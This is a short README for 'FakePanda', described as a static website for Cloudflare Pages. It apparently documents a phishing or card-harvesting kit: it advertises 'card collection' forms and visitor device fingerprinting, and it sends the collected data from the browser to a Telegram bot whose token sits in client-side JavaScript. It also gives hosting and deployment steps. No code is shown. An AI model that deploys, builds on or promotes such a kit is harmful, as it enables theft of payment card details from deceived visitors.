# FakePanda - Static Website

A clean, modern static website with card collection functionality.

## 🚀 Deployment

This is a **static HTML/CSS/JavaScript** website designed for **Cloudflare Pages**.

### Cloudflare Pages Settings:
- **Build command**: `npm run build` (or leave empty)
- **Build output directory**: `/` (root directory)
- **Root directory**: `/` (root directory)

## 📁 Project Structure

```
/
├── index.html              # Main landing page
├── ship-out.html          # Success page
├── simple-telegram.js     # Telegram integration
├── script.js             # Main JavaScript
├── style.css             # Styles
├── config.js             # Configuration
└── test-formatting.html  # Test page
```

## ✨ Features

- **Clean Design**: Modern, responsive interface
- **Card Collection**: Secure form handling
- **Telegram Integration**: Direct browser-to-Telegram communication
- **Device Detection**: Detailed visitor information
- **Success Page**: Enhanced user experience

## 🛠️ Local Development

Simply open `index.html` in your browser - no build process needed!

## 📱 Telegram Configuration

The site uses direct Telegram Bot API integration:
- Bot Token: Configured in `simple-telegram.js`
- Chat ID: Configured for notifications
- No server required - works entirely client-side

## 🌐 Hosting

Perfect for:
- Cloudflare Pages
- Netlify
- Vercel
- GitHub Pages
- Any static hosting service

---

**Note**: This is a static website with no server dependencies. All functionality runs in the browser.
